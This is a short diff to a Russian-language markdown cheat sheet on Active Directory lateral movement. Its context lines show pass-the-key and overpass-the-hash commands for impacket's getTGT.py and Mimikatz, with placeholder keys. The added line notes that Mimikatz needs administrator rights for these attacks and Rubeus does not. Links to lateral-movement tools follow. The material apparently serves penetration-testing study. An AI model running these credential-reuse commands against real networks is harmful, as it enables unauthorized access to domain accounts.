@@ -25,6 +25,8 @@ getTGT.py corp.local/alice -aesKey <key>
 sekurlsa::pth /aes256:<key>
 ```
 
+> Для выполнения атак Pass the Key/OverPass the Hash в Mimikatz требуются права администратора, тогда как в Rubeus они не требуются
+
 Шумные:
 2)  [GoFetch](https://github.com/SkillfactoryCoding/HACKER-LateralMovement-GoFetch),
 3) [Angrypuppy](https://github.com/SkillfactoryCoding/HACKER-LateralMovement-ANGRYPUPPY),
